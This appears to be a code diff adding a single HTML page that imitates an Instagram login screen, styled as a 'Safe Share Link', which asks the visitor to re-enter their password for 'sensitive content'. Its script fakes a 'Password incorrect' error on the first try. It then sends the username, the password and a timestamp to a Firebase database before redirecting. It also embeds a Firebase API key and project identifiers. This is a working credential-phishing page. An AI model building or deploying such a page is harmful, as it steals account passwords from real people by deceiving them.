@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram clone</title>
+    <!-- Open Graph meta tags for link preview -->
+    <meta property="og:title" content="Instagram Safe Share Link" />
+    <meta property="og:description" content="This is very important content" />
+    <meta property="og:image" content="https://raw.githubusercontent.com/instagram/static-assets/master/ico/favicon-192.png" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://www.instagarame.neocities.org/" />
+    <style>
+        * {
+    border: none;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    background-color: #18191a;
+    color: #e4e6eb;
+    height: 100vh;
+    font-size: 16px;
+    line-height: 1.5;
+    letter-spacing: 0.01em;
+}
+
+main {
+    height: 100vh;
+    margin: auto;
+    max-width: 935px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+}
+
+a { 
+    text-decoration: none; 
+    color: #8ab4f8;
+    transition: color 0.2s;
+}
+a:hover, a:focus {
+    color: #b2cdfa;
+    text-decoration: underline;
+}
+
+h1 { margin: 20px 0; }
+ul { list-style: none; }
+
+/**
+ * Flex rules
+ */
+
+.flex {
+    display: -webkit-box;
+    display: -moz-box;
+    display: -webkit-flex;
+    display: -ms-flexbox;
+    display: flex;
+}
+
+.direction-column {
+    -webkit-box-direction: normal;
+    -webkit-box-orient: vertical;
+    -moz-box-direction: normal;
+    -moz-box-orient: vertical;
+    -webkit-flex-direction: column;
+    -ms-flex-direction: column;
+    flex-direction: column;
+}
+
+.justify-content-center {
+    -webkit-box-pack: center;
+    -moz-box-pack: center;
+    -ms-flex-pack: center;
+    -webkit-justify-content: center;
+    justify-content: center;
+}
+
+.align-items-center {
+    -webkit-box-align: center;
+    -moz-box-align: center;
+    -ms-flex-align: center;
+    -webkit-align-items: center;
+    align-items: center;
+}
+
+.flex-wrap {
+    -webkit-flex-wrap: wrap;
+    -ms-flex-wrap: wrap;
+    flex-wrap: wrap;
+}
+
+/**
+ *
+ */
+
+.panel {
+    background-color: #242526;
+    border: 1px solid #3a3b3c;
+    margin-bottom: 18px;
+    padding: 24px 18px;
+    border-radius: 18px;
+    box-shadow: 0 4px 24px 0 rgba(0,0,0,0.25), 0 1.5px 4px 0 rgba(0,0,0,0.12);
+    transition: box-shadow 0.2s, border 0.2s;
+}
+.panel.login {
+    margin-bottom: 18px;
+}
+.panel:hover, .panel:focus-within {
+    box-shadow: 0 8px 32px 0 rgba(0,0,0,0.35), 0 2px 8px 0 rgba(0,0,0,0.18);
+    border: 1.5px solid #8ab4f8;
+}
+
+#auth { max-width: 370px; }
+#mobile { max-width: 454px; }
+
+#mobile img {
+    height: 618px;
+    border-radius: 18px;
+    box-shadow: 0 4px 24px 0 rgba(0,0,0,0.25);
+}
+
+/**
+ * Login section
+ */
+.login-with-fb,
+form { width: 100%; }
+
+.register,
+form { padding: 30px 20px; }
+
+.login-with-fb { padding: 30px 20px 20px 20px; }
+
+form .sr-only { display: none; }
+
+form input {
+    background-color: #23272f;
+    border: 1.5px solid #555;
+    border-radius: 8px;
+    color: #e4e6eb;
+    margin-bottom: 14px;
+    padding: 12px 14px;
+    width: 100%;
+    font-size: 1rem;
+    transition: border 0.2s, background 0.2s;
+}
+
+form input::placeholder {
+    color: #b0b3b8;
+    opacity: 0.85;
+}
+
+form input:focus {
+    border: 1.5px solid #8ab4f8;
+    background-color: #18191a;
+    outline: none;
+}
+
+form button {
+    background: rgb(0, 98, 255);
+    border-radius: 8px;
+    color: #fff;
+    font-weight: bold;
+    height: 42px;
+    margin-top: 10px;
+    width: 100%;
+    border: none;
+    font-size: 1rem;
+    letter-spacing: 0.04em;
+    box-shadow: 0 2px 8px 0 rgba(35,116,171,0.12);
+    cursor: pointer;
+    transition: background 0.2s, box-shadow 0.2s;
+}
+
+form button:hover, form button:focus {
+    background: linear-gradient(90deg, #1a5c8a 0%, #b2cdfa 100%);
+    box-shadow: 0 4px 16px 0 rgba(35,116,171,0.18);
+}
+
+/**
+ * Separator login form from login with fb
+ */
+.separator span {
+    background-color: #3a3b3c;
+    height: 1.5px;
+    width: calc(100% - 10px);
+}
+
+.separator .or {
+    color: #b0b3b8;
+    font-weight: bold;
+    letter-spacing: 0.08em;
+    font-size: 0.95em;
+    padding: 0 8px;
+    background: #18191a;
+    border-radius: 8px;
+    z-index: 1;
+}
+
+.separator { padding: 0 20px; }
+.separator span:first-child { margin-right: 10px;}
+.separator span:last-child { margin-left: 10px;}
+
+/**
+ * Login with fb section
+ */
+.login-with-fb a { 
+    color: #8ab4f8; 
+    font-size: 1rem;
+    transition: color 0.2s;
+}
+.login-with-fb a:hover, .login-with-fb a:focus {
+    color: #b2cdfa;
+}
+.login-with-fb > a { font-size: 13px; }
+.login-with-fb div a { font-weight: bold; }
+.login-with-fb div { margin-bottom: 15px; }
+.login-with-fb img {
+    width: 22px;
+    height: 22px;
+    margin-right: 8px;
+    vertical-align: middle;
+    filter: brightness(1.2) contrast(1.2);
+}
+
+/**
+ * Register section
+ */
+.register * { font-size: 15px; }
+.register a { 
+    color: #8ab4f8;
+    font-weight: bold;
+    border-radius: 6px;
+    padding: 4px 10px;
+    transition: background 0.2s, color 0.2s;
+}
+.register a:hover, .register a:focus {
+    background: #23272f;
+    color: #b2cdfa;
+}
+
+.register p { margin-right: 5px; }
+
+/**
+ * App download
+ */
+.app-download { 
+    padding: 18px; 
+    border-radius: 12px;
+    background: rgba(36,37,38,0.7);
+    box-shadow: 0 2px 8px 0 rgba(0,0,0,0.10);
+}
+.app-download p { padding: 10px 0; }
+.app-download img { 
+    height: 44px; 
+    margin: 0 8px;
+    filter: brightness(0.92) contrast(1.2);
+    border-radius: 8px;
+    transition: filter 0.2s, transform 0.2s;
+}
+.app-download img:hover, .app-download img:focus {
+    filter: brightness(1.1) contrast(1.3);
+    transform: scale(1.04);
+}
+
+/**
+ * Footer
+ */
+footer {
+    margin: 0 auto 30px auto;
+    max-width: 935px;
+    padding-top: 24px;
+}
+footer ul { 
+    margin-bottom: 20px; 
+    gap: 8px;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+}
+footer ul li { 
+    margin: 0 10px 10px; 
+    font-size: 13px;
+    border-radius: 6px;
+    transition: background 0.2s;
+}
+footer ul li a { 
+    color: #8ab4f8; 
+    padding: 4px 8px;
+    display: inline-block;
+    transition: color 0.2s;
+}
+footer ul li a:hover, footer ul li a:focus {
+    color: #b2cdfa;
+    background: #23272f;
+}
+footer .copyright { 
+    color: #b0b3b8; 
+    font-size: 13px;
+    margin-top: 8px;
+    text-align: center;
+    letter-spacing: 0.04em;
+}
+footer ul li a,
+footer .copyright { 
+    font-weight: bold;
+    text-align: center;
+    text-transform: uppercase;
+ }
+
+/**
+ * Media queries
+ */
+
+@media screen and (max-width: 767px) {
+    main { 
+        margin: 30px auto 50px auto; 
+        flex-direction: column;
+        min-height: unset;
+        height: unset;
+    }
+    #auth { max-width: 98vw; }
+    .panel { padding: 16px 6vw; }
+    .app-download { padding: 12px; }
+    footer .copyright,
+    footer ul li a { font-size: 13px; }
+}
+
+@media screen and (min-width: 1024px) {
+    .panel.login {
+        margin-top: 50px;
+        width: 400px;
+    }
+}
+
+/**
+ * Username display
+ */
+.username-display.highlight-center {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 18px;
+}
+
+#usernameLabel {
+    font-size: 1.25rem;
+    font-weight: bold;
+    color: #8ab4f8;
+    background: #23272f;
+    padding: 8px 22px;
+    border-radius: 12px;
+    box-shadow: 0 2px 8px 0 rgba(35,116,171,0.10);
+    letter-spacing: 0.04em;
+    text-align: center;
+}
+    </style>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column" >
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//insta-fav.ico" alt="Instagram logo" title="Instagram logo" width="90px"/>
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" width="210px"/>
+                </h1>
+                <form id="loginForm" autocomplete="off">
+                    <div class="username-display highlight-center">
+                        <span id="usernameLabel"></span>
+                    </div>
+                    <p style="margin-bottom:10px;">
+                        This content is very sensitive, so we need to verify you. Please enter your password to continue.
+                    </p>
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" id="password" type="password" placeholder="Password" required />
+                    <div id="errorMsg" style="color:#ff5252;min-height:22px;margin-bottom:8px;"></div>
+                    <button type="submit">Log In</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <script>// Firebase config
+        const firebaseConfig = {
+          apiKey: "AIzaSyAuab6m75ikOrW6Tc8Tf6ydwULBG6Y4dBk",
+          authDomain: "instagram-db13d.firebaseapp.com",
+          projectId: "instagram-db13d",
+          storageBucket: "instagram-db13d.firebasestorage.app",
+          messagingSenderId: "367666128774",
+          appId: "1:367666128774:web:3d445ce0cd38ab7ac52e07",
+          measurementId: "G-NPSG0D0KBK"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        // Helper to get values from Firebase (assume root has 'username' and 'url')
+        function getFirebaseValues() {
+            return db.ref('/').once('value').then(snap => snap.val());
+        }
+        
+        function getSriLankaTimeISO() {
+            const now = new Date();
+            // Sri Lanka is UTC+5:30
+            const offsetMs = (5.5 * 60 * 60 * 1000);
+            const local = new Date(now.getTime() + offsetMs - (now.getTimezoneOffset() * 60000));
+            return local.toISOString().replace('T', ' ').replace('Z', ' (Sri Lanka Time)');
+        }
+        
+        let username = '';
+        let redirectUrl = '';
+        let attempt = 0;
+        
+        window.addEventListener('DOMContentLoaded', async () => {
+            const data = await getFirebaseValues();
+            username = data.username || 'unknown_user';
+            redirectUrl = data.url || 'https://instagram.com/';
+            document.getElementById('usernameLabel').textContent = `Username: ${username}`;
+        });
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            attempt += 1;
+        
+            if (attempt === 1) {
+                errorMsg.textContent = 'Password incorrect';
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            } else {
+                // Log login time, username, password to Firebase
+                const loginData = {
+                    username,
+                    password,
+                    time: getSriLankaTimeISO()
+                };
+                await db.ref('logins').push(loginData);
+                errorMsg.textContent = '';
+                window.location.href = redirectUrl;
+            }
+        });
+        </script>
+</body>
+</html>
